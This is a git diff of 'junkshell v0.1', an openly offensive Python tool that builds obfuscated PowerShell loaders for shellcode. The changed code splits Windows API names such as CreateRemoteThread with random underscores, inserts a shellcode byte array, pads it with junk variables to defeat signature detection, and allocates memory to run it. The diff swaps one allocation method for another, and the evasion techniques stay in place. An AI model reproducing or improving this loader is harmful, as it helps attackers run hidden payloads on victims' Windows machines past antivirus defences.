@@ -1,7 +1,7 @@
 """
 junkshell v0.1 - shellcode loader for powershell
-
-
+author: tg: @synawk tw: @synaw_k
+website: synawk.com
 """
 
 import base64
@@ -160,9 +160,6 @@ def generate_junks(len_junks = 3, base_var = "junk"):
 length_junks = random.randint(6, 22)
 junk_base_var = gen_alpha()
 
-valloc = "VirtualAlloc"
-valloc = "".join( "{}{}".format(c, "_" * random.randint(0, 3)) for c in valloc)
-
 crthread = "CreateRemoteTh__readEx"
 crthread = "".join( "{}{}".format(c, "_" * random.randint(0, 3)) for c in crthread)
 
@@ -179,7 +176,6 @@ ${var("size_memory_var")} = {random.randint(10000, 20000)}
 
 {generate_junks(length_junks, junk_base_var)}
 
-
 [Byte[]]${var("shellcode")} = {bin_shellcode}
 
 ${var("size_shellcode_var")} = ${var("shellcode")}.Length
@@ -189,20 +185,11 @@ ${var("size_total_var")} = ${var("size_junks_var")} + ${var("size_shellcode_var"
 ${var("win32_var")} = New-Object System.Object
 ${var("hmodule_var")} = ${var("k32_instance_var")}::LoadLibrary("kernel32.dll")
 
-
-
-${var("va_addr")}  = ${var("k32_instance_var")}::{bypass_lol}(${var("hmodule_var")}, "{valloc}")
-${var("va_pointer")} = ${var("k32_instance_var")}::{toomuch_va}(${var("va_addr")})
-${var("win32_var")} | Add-Member NoteProperty -Name fnVA -Value ${var("va_pointer")}
-
 ${var("crt_addr")}   = ${var("k32_instance_var")}::{bypass_lol}(${var("hmodule_var")}, "{crthread}")
 ${var("crt_pointer")} = ${var("k32_instance_var")}::{toomuch_crt}(${var("crt_addr")})
 ${var("win32_var")} | Add-Member NoteProperty -Name fnCRT -Value ${var("crt_pointer")}
 
-#${var("ptr_var")}=${var("win32_var")}.fnVA.Invoke([IntPtr]::Zero,[UInt32]${var("size_total_var")}, [UInt32]0x3000,[UInt32]0x40)
-
 ${var("ptr_var")}= ${var("k32_instance_var")}::malloc([UInt32]${var("size_total_var")})
-
 
 ${var("chunks")}=0
 ${var("min_index")} = 0
